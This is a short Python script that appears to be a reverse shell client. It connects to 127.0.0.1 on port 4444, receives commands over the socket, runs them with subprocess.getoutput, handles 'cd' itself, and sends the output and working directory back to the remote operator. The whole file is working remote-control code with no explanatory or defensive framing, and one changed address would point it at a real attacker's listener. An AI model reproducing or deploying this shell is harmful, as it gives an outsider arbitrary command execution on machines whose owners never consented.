import socket  
import subprocess
import os

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip_address = '127.0.0.1'
port = 4444

client_socket.connect((ip_address, port))

while True:
    command = client_socket.recv(1024).decode()
    if command.lower().strip() == "exit":
        break
    elif command.lower().startswith("cd "):
        try:
            os.chdir(command[3:].strip())
            client_socket.send(b"Changed directory")
        except FileNotFoundError:
            client_socket.send(b"Directory not found")
    else:
        output = subprocess.getoutput(command)
        client_socket.send(output.encode())
    cwd = os.getcwd()
    client_socket.send(cwd.encode())




